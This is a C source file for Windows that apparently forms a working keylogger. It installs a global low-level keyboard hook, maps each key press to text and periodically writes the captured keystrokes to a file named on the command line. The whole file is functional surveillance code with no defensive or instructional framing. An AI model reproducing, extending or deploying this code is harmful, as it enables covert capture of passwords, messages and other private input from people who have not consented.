#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "writetofile.h"
#include "keymap.h"

#define INFO "[>]"
#define ERROR "[-]"

char* buffer = NULL;
SIZE_T sBufferSize = 256;
LPCSTR lpFileName = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    DWORD dwKey = 0;

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            dwKey = pKeyboard->vkCode;

            if (strlen(buffer) + 10 >= sBufferSize) {
                sBufferSize *= 2;  
                char* newBuffer = realloc(buffer, sBufferSize);
                if (newBuffer == NULL) {
                    printf("%s Memory reallocation failed with error: 0x%x\n", ERROR, GetLastError());
                    free(buffer);
                    exit(1);
                }
                buffer = newBuffer;  
            }

            for (int i = 0; i < sizeof(keyMaps) / sizeof(keyMaps[0]); i++) {
                if (keyMaps[i].VKCODE == dwKey) {
                    strcat(buffer, keyMaps[i].value);
                    break;
                }
            }
        }

        if (strlen(buffer) % 10 == 0 && strlen(buffer) > 0) {
            WriteToFile(lpFileName, buffer);
            memset(buffer, 0, sBufferSize); 
        }

        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }

    lpFileName = argv[1];

    buffer = malloc(sBufferSize);
    if (buffer == NULL) {
        printf("%s Memory allocation failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }

    memset(buffer, 0, sBufferSize);

    HHOOK hHook;
    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        printf("%s SetWindowsHookEx failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    free(buffer);
    UnhookWindowsHookEx(hHook);

    return 0;
}
